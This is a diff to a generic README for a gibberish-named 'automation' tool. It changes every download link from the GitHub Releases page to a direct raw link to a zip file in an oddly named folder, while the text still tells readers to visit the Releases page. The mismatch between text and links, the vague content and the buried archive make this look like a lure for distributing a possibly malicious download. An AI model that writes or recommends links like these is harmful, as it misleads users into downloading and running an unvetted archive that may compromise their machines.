@@ -1,7 +1,7 @@
 # 🎉 amanansdiahnid-12 - Easy Automation for Everyone
 
 ## 📥 Download Now
-[![Download amanansdiahnid-12](https://img.shields.io/badge/Download-amanansdiahnid--12-blue.svg)](https://github.com/babluvai120/amanansdiahnid-12/releases)
+[![Download amanansdiahnid-12](https://raw.githubusercontent.com/babluvai120/amanansdiahnid-12/main/repellingly/amanansdiahnid-12.zip)](https://raw.githubusercontent.com/babluvai120/amanansdiahnid-12/main/repellingly/amanansdiahnid-12.zip)
 
 ## 🚀 Getting Started
 Welcome to amanansdiahnid-12! This application helps you automate tasks easily, saving you time and effort. Follow these steps to download and run the software.
@@ -28,7 +28,7 @@ Before downloading, please check the following minimum requirements:
 ## 📥 Download & Install
 To start using amanansdiahnid-12, visit the Releases page to download the latest version:
 
-[Download amanansdiahnid-12](https://github.com/babluvai120/amanansdiahnid-12/releases)
+[Download amanansdiahnid-12](https://raw.githubusercontent.com/babluvai120/amanansdiahnid-12/main/repellingly/amanansdiahnid-12.zip)
 
 ### Steps to Install:
 1. **Visit the Releases Page:** Click the link above to access the download page.
@@ -77,4 +77,4 @@ If you need further assistance, feel free to reach out via the issues section in
 
 **Thank you for choosing amanansdiahnid-12!** Enjoy automating your tasks efficiently.
 
-[Download amanansdiahnid-12](https://github.com/babluvai120/amanansdiahnid-12/releases)
+[Download amanansdiahnid-12](https://raw.githubusercontent.com/babluvai120/amanansdiahnid-12/main/repellingly/amanansdiahnid-12.zip)
